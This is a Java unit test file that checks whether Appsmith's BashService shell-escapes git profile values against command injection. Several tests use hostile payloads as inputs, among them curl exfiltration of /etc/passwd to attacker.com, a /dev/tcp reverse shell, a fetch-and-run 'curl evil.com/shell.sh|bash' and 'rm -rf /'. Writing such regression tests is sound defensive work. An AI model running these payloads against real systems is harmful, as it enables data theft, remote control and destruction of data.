package com.appsmith.git.service;

import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Nested;
import org.junit.jupiter.api.Test;

import java.lang.reflect.Method;

import static org.assertj.core.api.Assertions.assertThat;

/**
 * Unit tests for BashService, specifically focused on security aspects
 * and prevention of OS command injection vulnerabilities.
 *
 * These tests validate that the shellEscape method properly sanitizes
 * user input to prevent command injection via:
 * - Command substitution: $(...) and `...`
 * - Variable expansion: $VAR, ${VAR}
 * - Single quotes in values
 * - Newlines and other special characters
 */
class BashServiceTest {

    private BashService bashService;

    @BeforeEach
    void setUp() {
        bashService = new BashService();
    }

    // Helper to invoke package-private shellEscape method
    private String invokeShellEscape(String value) throws Exception {
        Method method = BashService.class.getDeclaredMethod("shellEscape", String.class);
        method.setAccessible(true);
        return (String) method.invoke(bashService, value);
    }

    // Helper to invoke private buildFullCommand method
    private String invokeBuildFullCommand(String scriptContent, String functionName, String... args) throws Exception {
        Method method =
                BashService.class.getDeclaredMethod("buildFullCommand", String.class, String.class, String[].class);
        method.setAccessible(true);
        return (String) method.invoke(bashService, scriptContent, functionName, args);
    }

    @Nested
    @DisplayName("shellEscape() - Command Injection Prevention")
    class ShellEscapeCommandInjectionTests {

        @Test
        @DisplayName("escapes $() command substitution to prevent injection")
        void escapesCommandSubstitution() throws Exception {
            String input = "x$(id)";
            String escaped = invokeShellEscape(input);

            assertThat(escaped).isEqualTo("'x$(id)'");
            // Verify the dangerous pattern is now inside single quotes
            assertThat(escaped).startsWith("'");
            assertThat(escaped).endsWith("'");
        }

        @Test
        @DisplayName("escapes nested $() command substitution")
        void escapesNestedCommandSubstitution() throws Exception {
            String input = "$(curl attacker.com/$(whoami))";
            String escaped = invokeShellEscape(input);

            assertThat(escaped).isEqualTo("'$(curl attacker.com/$(whoami))'");
        }

        @Test
        @DisplayName("escapes backtick command substitution")
        void escapesBackticks() throws Exception {
            String input = "x`whoami`y";
            String escaped = invokeShellEscape(input);

            assertThat(escaped).isEqualTo("'x`whoami`y'");
        }

        @Test
        @DisplayName("escapes nested backtick substitution")
        void escapesNestedBackticks() throws Exception {
            String input = "`curl evil.com/`id``";
            String escaped = invokeShellEscape(input);

            assertThat(escaped).isEqualTo("'`curl evil.com/`id``'");
        }

        @Test
        @DisplayName("escapes sleep injection payload from vulnerability report")
        void escapesSleepInjectionPayload() throws Exception {
            // This is the exact payload from the vulnerability report
            String input = "x$(sleep 3)";
            String escaped = invokeShellEscape(input);

            assertThat(escaped).isEqualTo("'x$(sleep 3)'");
        }

        @Test
        @DisplayName("escapes curl data exfiltration payload")
        void escapesCurlExfiltrationPayload() throws Exception {
            String input = "x$(curl attacker.com/?data=$(cat /etc/passwd | base64 -w0))";
            String escaped = invokeShellEscape(input);

            assertThat(escaped).isEqualTo("'x$(curl attacker.com/?data=$(cat /etc/passwd | base64 -w0))'");
        }

        @Test
        @DisplayName("escapes reverse shell payload")
        void escapesReverseShellPayload() throws Exception {
            String input = "x$(bash -i >& /dev/tcp/attacker.com/4444 0>&1)";
            String escaped = invokeShellEscape(input);

            assertThat(escaped).isEqualTo("'x$(bash -i >& /dev/tcp/attacker.com/4444 0>&1)'");
        }
    }

    @Nested
    @DisplayName("shellEscape() - Variable Expansion Prevention")
    class ShellEscapeVariableExpansionTests {

        @Test
        @DisplayName("escapes simple variable expansion")
        void escapesSimpleVariable() throws Exception {
            String input = "$HOME";
            String escaped = invokeShellEscape(input);

            assertThat(escaped).isEqualTo("'$HOME'");
        }

        @Test
        @DisplayName("escapes braced variable expansion")
        void escapesBracedVariable() throws Exception {
            String input = "${HOME}";
            String escaped = invokeShellEscape(input);

            assertThat(escaped).isEqualTo("'${HOME}'");
        }

        @Test
        @DisplayName("escapes variable with default value syntax")
        void escapesVariableWithDefault() throws Exception {
            String input = "${VAR:-default}";
            String escaped = invokeShellEscape(input);

            assertThat(escaped).isEqualTo("'${VAR:-default}'");
        }

        @Test
        @DisplayName("escapes arithmetic expansion")
        void escapesArithmeticExpansion() throws Exception {
            String input = "$((1+1))";
            String escaped = invokeShellEscape(input);

            assertThat(escaped).isEqualTo("'$((1+1))'");
        }
    }

    @Nested
    @DisplayName("shellEscape() - Single Quote Handling")
    class ShellEscapeSingleQuoteTests {

        @Test
        @DisplayName("escapes single quotes within value")
        void escapesSingleQuotes() throws Exception {
            String input = "John's name";
            String escaped = invokeShellEscape(input);

            // Single quote becomes: '\'' (end quote, literal quote, start quote)
            assertThat(escaped).isEqualTo("'John'\\''s name'");
        }

        @Test
        @DisplayName("escapes multiple single quotes")
        void escapesMultipleSingleQuotes() throws Exception {
            String input = "It's John's book";
            String escaped = invokeShellEscape(input);

            assertThat(escaped).isEqualTo("'It'\\''s John'\\''s book'");
        }

        @Test
        @DisplayName("escapes single quote at start")
        void escapesSingleQuoteAtStart() throws Exception {
            String input = "'quoted";
            String escaped = invokeShellEscape(input);

            assertThat(escaped).isEqualTo("''\\''quoted'");
        }

        @Test
        @DisplayName("escapes single quote at end")
        void escapesSingleQuoteAtEnd() throws Exception {
            String input = "quoted'";
            String escaped = invokeShellEscape(input);

            assertThat(escaped).isEqualTo("'quoted'\\'''");
        }

        @Test
        @DisplayName("escapes only single quote")
        void escapesOnlySingleQuote() throws Exception {
            String input = "'";
            String escaped = invokeShellEscape(input);

            assertThat(escaped).isEqualTo("''\\'''");
        }

        @Test
        @DisplayName("escapes consecutive single quotes")
        void escapesConsecutiveSingleQuotes() throws Exception {
            String input = "a''b";
            String escaped = invokeShellEscape(input);

            assertThat(escaped).isEqualTo("'a'\\'''\\''b'");
        }
    }

    @Nested
    @DisplayName("shellEscape() - Edge Cases")
    class ShellEscapeEdgeCaseTests {

        @Test
        @DisplayName("handles null input")
        void handlesNull() throws Exception {
            String escaped = invokeShellEscape(null);

            assertThat(escaped).isEqualTo("''");
        }

        @Test
        @DisplayName("handles empty string")
        void handlesEmptyString() throws Exception {
            String escaped = invokeShellEscape("");

            assertThat(escaped).isEqualTo("''");
        }

        @Test
        @DisplayName("preserves normal text in single quotes")
        void preservesNormalText() throws Exception {
            String input = "John Doe";
            String escaped = invokeShellEscape(input);

            assertThat(escaped).isEqualTo("'John Doe'");
        }

        @Test
        @DisplayName("preserves newlines within single quotes")
        void preservesNewlines() throws Exception {
            String input = "line1\nline2";
            String escaped = invokeShellEscape(input);

            assertThat(escaped).isEqualTo("'line1\nline2'");
        }

        @Test
        @DisplayName("preserves tabs within single quotes")
        void preservesTabs() throws Exception {
            String input = "col1\tcol2";
            String escaped = invokeShellEscape(input);

            assertThat(escaped).isEqualTo("'col1\tcol2'");
        }

        @Test
        @DisplayName("handles double quotes (no special escaping needed)")
        void handlesDoubleQuotes() throws Exception {
            String input = "say \"hello\"";
            String escaped = invokeShellEscape(input);

            assertThat(escaped).isEqualTo("'say \"hello\"'");
        }

        @Test
        @DisplayName("handles backslashes")
        void handlesBackslashes() throws Exception {
            String input = "path\\to\\file";
            String escaped = invokeShellEscape(input);

            assertThat(escaped).isEqualTo("'path\\to\\file'");
        }

        @Test
        @DisplayName("handles glob patterns")
        void handlesGlobPatterns() throws Exception {
            String input = "*.txt";
            String escaped = invokeShellEscape(input);

            assertThat(escaped).isEqualTo("'*.txt'");
        }

        @Test
        @DisplayName("handles semicolon (command separator)")
        void handlesSemicolon() throws Exception {
            String input = "cmd1; cmd2";
            String escaped = invokeShellEscape(input);

            assertThat(escaped).isEqualTo("'cmd1; cmd2'");
        }

        @Test
        @DisplayName("handles pipe")
        void handlesPipe() throws Exception {
            String input = "cmd | other";
            String escaped = invokeShellEscape(input);

            assertThat(escaped).isEqualTo("'cmd | other'");
        }

        @Test
        @DisplayName("handles ampersand")
        void handlesAmpersand() throws Exception {
            String input = "cmd & bg";
            String escaped = invokeShellEscape(input);

            assertThat(escaped).isEqualTo("'cmd & bg'");
        }

        @Test
        @DisplayName("handles redirection operators")
        void handlesRedirection() throws Exception {
            String input = "cmd > /tmp/out 2>&1";
            String escaped = invokeShellEscape(input);

            assertThat(escaped).isEqualTo("'cmd > /tmp/out 2>&1'");
        }
    }

    @Nested
    @DisplayName("buildFullCommand() - Integration Tests")
    class BuildFullCommandTests {

        @Test
        @DisplayName("generates escaped variable assignments")
        void generatesEscapedAssignments() throws Exception {
            String script = "# test script";
            String result = invokeBuildFullCommand(script, "test_func", "arg1_value", "arg2_value");

            assertThat(result).contains("arg1='arg1_value'");
            assertThat(result).contains("arg2='arg2_value'");
            assertThat(result).contains("test_func \"$arg1\" \"$arg2\"");
        }

        @Test
        @DisplayName("malicious authorName from vulnerability report is safely escaped")
        void maliciousAuthorNameIsSafelyEscaped() throws Exception {
            String script = "# git script";
            // Simulate the exact attack scenario from the vulnerability report
            String maliciousAuthorName = "x$(sleep 5)";

            String result = invokeBuildFullCommand(
                    script,
                    "git_download",
                    "email@example.com",
                    maliciousAuthorName,
                    "privateKey",
                    "repoKey",
                    "redis://localhost",
                    "git@github.com:org/repo.git",
                    "/tmp/repo",
                    "branchStore");

            // The malicious payload should be single-quoted, preventing execution
            assertThat(result).contains("arg2='x$(sleep 5)'");
            // Should NOT contain double-quoted assignment (vulnerable pattern)
            assertThat(result).doesNotContain("arg2=\"x$(sleep 5)\"");
        }

        @Test
        @DisplayName("malicious authorEmail is safely escaped")
        void maliciousAuthorEmailIsSafelyEscaped() throws Exception {
            String script = "# git script";
            String maliciousEmail = "`id`@evil.com";

            String result = invokeBuildFullCommand(
                    script,
                    "git_download",
                    maliciousEmail,
                    "normalName",
                    "key",
                    "repo",
                    "url",
                    "remote",
                    "path",
                    "branch");

            assertThat(result).contains("arg1='`id`@evil.com'");
            assertThat(result).doesNotContain("arg1=\"`id`@evil.com\"");
        }

        @Test
        @DisplayName("handles single quotes in git profile values")
        void handlesSingleQuotesInValues() throws Exception {
            String script = "# test";
            String result = invokeBuildFullCommand(script, "func", "O'Brien", "test@example.com");

            assertThat(result).contains("arg1='O'\\''Brien'");
        }

        @Test
        @DisplayName("handles empty args array")
        void handlesEmptyArgs() throws Exception {
            String script = "# test";
            String result = invokeBuildFullCommand(script, "func");

            assertThat(result).contains("# test");
            assertThat(result).contains("func ");
            assertThat(result).doesNotContain("arg1=");
        }

        @Test
        @DisplayName("handles complex multi-vector attack payload")
        void handlesComplexAttackPayload() throws Exception {
            String script = "# test";
            // Payload attempting multiple attack vectors
            String payload = "x$(curl evil.com/`whoami`?home=$HOME)";

            String result = invokeBuildFullCommand(script, "func", payload);

            assertThat(result).contains("arg1='x$(curl evil.com/`whoami`?home=$HOME)'");
        }

        @Test
        @DisplayName("function call uses double-quoted variable references")
        void functionCallUsesDoubleQuotedRefs() throws Exception {
            String script = "# test";
            String result = invokeBuildFullCommand(script, "my_func", "a", "b", "c");

            // Variables in function call should be double-quoted to preserve spaces
            assertThat(result).contains("my_func \"$arg1\" \"$arg2\" \"$arg3\"");
        }
    }

    @Nested
    @DisplayName("Security Regression Tests")
    class SecurityRegressionTests {

        @Test
        @DisplayName("CVE-style: command injection via authorName is prevented")
        void commandInjectionViaAuthorNamePrevented() throws Exception {
            // Simulates the reported vulnerability
            String[] payloads = {
                "x$(id)",
                "x`id`",
                "$(cat /etc/passwd)",
                "`rm -rf /`",
                "x$(curl http://evil.com/shell.sh|bash)",
                "'; rm -rf /; echo '",
                "$(sleep 10)"
            };

            for (String payload : payloads) {
                String escaped = invokeShellEscape(payload);
                // Verify all payloads are wrapped in single quotes
                assertThat(escaped)
                        .as("Payload '%s' should be wrapped in single quotes", payload)
                        .startsWith("'")
                        .endsWith("'");
                // Verify no double quotes are used for assignment
                assertThat(escaped)
                        .as("Payload '%s' should not use double quotes", payload)
                        .doesNotContain("\"" + payload + "\"");
            }
        }

        @Test
        @DisplayName("original vulnerable pattern is no longer generated")
        void vulnerablePatternNotGenerated() throws Exception {
            String script = "# test";
            String malicious = "x$(id)";

            String result = invokeBuildFullCommand(script, "func", malicious);

            // The vulnerable pattern was: arg1="x$(id)"
            assertThat(result).doesNotContain("arg1=\"x$(id)\"");
            // The safe pattern is: arg1='x$(id)'
            assertThat(result).contains("arg1='x$(id)'");
        }
    }
}
